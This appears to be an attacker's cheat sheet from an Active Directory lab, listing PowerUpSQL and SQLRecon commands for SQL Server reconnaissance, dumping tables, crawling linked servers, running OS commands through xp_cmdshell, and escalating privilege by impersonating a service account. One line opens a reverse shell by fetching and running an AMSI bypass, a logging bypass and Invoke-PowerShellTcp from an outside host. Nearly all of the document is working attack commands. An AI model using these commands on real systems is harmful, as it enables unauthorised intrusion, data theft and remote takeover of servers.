### Reconnaissance ###

#### 1. Identify Local and Domain SQL Server Instances ####
- Discover Local SQL Server Instances
`Get-SQLInstanceLocal`

- Discover Domain SQL Server Instances
`Get-SQLInstanceDomain -Verbose`

- Get Server Info for Domain SQL Server Instances
`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`

- Check Network Accessibility for Domain SQL Server Instances
`Get-SQLInstanceDomain | Get-SQLConnectionTest`

- List SQL Servers that use a specific domain account
`Get-SQLInstanceDomain -Verbose -DomainAccount svcadmin`

- Automate Information Gathering
`Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`

- Find the Roles that the current user has in a SQL Server Instance
`.\SQLRecon.exe /a:WinToken /h:dcorp-mssql.dollarcorp.moneycorp.local,1433 /m:whoami`

- Find users that have the *sql* string in their samaccountnames
`Get-DomainUser -Identity *SQL* | Select-Object samaccountname,cn,description`

- Find appropriately named domain groups and their members.
`Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }`

- Find MS SQL Impersonation Configurations in a SQL Server Instance
	- `.\SQLRecon.exe /a:WinToken /h:dcorp-mssql.dollarcorp.moneycorp.local,1433 /m:impersonate`

	- `Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';"`
	- `Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;"`

#### 2. Querying the Databases ####
- Find non-default Databases in Domain SQL Server Instances
`Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults`

- List all databases in SQL Server Instances (Local or Domain)
`Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT name FROM master.dbo.sysdatabases"`

- Get Tables from a Specific Database
	- `Get-SQLTable -Instance dcorp-mssql.dollarcorp.moneycorp.local -DatabaseName msdb`

	- `Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT table_name from master.INFORMATION_SCHEMA.TABLES"`

- List Table Columns on a Specific Database
`Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM sys.columns WHERE object_id = OBJECT_ID('dbo.spt_values')" | Select-Object name`

- Dump Table content from a Specific Database
`Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * from [master].[dbo].spt_monitor"`

#### 3. Enumerate Database Links ####
- Crawl Trusted Links
	- `Get-SQLInstanceDomain | Get-SQLServerLink`
	
	- `Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM master..sysservers"`

- Further Crawl Trusted Links using Nested Queries
	-  ```Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM openquery(`"DCORP-SQL1`",'SELECT * FROM master..sysservers')" | Select-Object srvname,srvproduct```
	 	 
	- ```Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM openquery(`"DCORP-SQL1`",'SELECT * FROM openquery(`"DCORP-MGMT`",''SELECT * FROM master..sysservers'')')" | Select-Object srvname,srvproduct```

- Recursively Crawl Trusted Links
`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose`

- Determine Names of Linked Databases
```Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM openquery(`"DCORP-SQL1`",'SELECT * FROM sys.databases')" | Select-Object name```

- List all the Tables Names from a Selected Linked Database
```Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM openquery(`"DCORP-SQL1`",'SELECT * FROM master.sys.tables')" | Select-Object name```

- Dump Table content from a Selected Linked Database
```Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT * FROM openquery(`"DCORP-SQL1`",'SELECT * from [master].[dbo].spt_monitor')"```

#### 4. Command Execution ####
- Enumerate current state of `xp_cmdshell`
`Get-SQLQuery -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';"`

- Execute OS commands: `xp_cmdshell`
`Invoke-SQLOSCmd -Instance dcorp-mssql.dollarcorp.moneycorp.local -Command whoami`

- Execute OS commands using Linked Databases
`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"`

- Get a reverse shell on a target Linked Database where `xp_cmshell` is enabled
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.99.3/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.99.3/amsibypasscrtp.txt);iex (iwr -UseBasicParsing http://172.16.99.3/Invoke-PowerShellTcp.ps1)"''' -QueryTarget eu-sql`

#### 4. Privilege Escalation ####
- From OS admin to sysadmin via service account impersonation -> then all PowerUpSQL commands can be run as a sysadmin.
`Invoke-SQLImpersonateService -Verbose -Instance dcorp-mssql.dollarcorp.moneycorp.local`

- Run Impersonation Mode
`\SQLRecon.exe /a:windows /h:dcorp-mssql.dollarcorp.moneycorp.local,1433 /m:iwhoami /i:DEV\mssql_svc`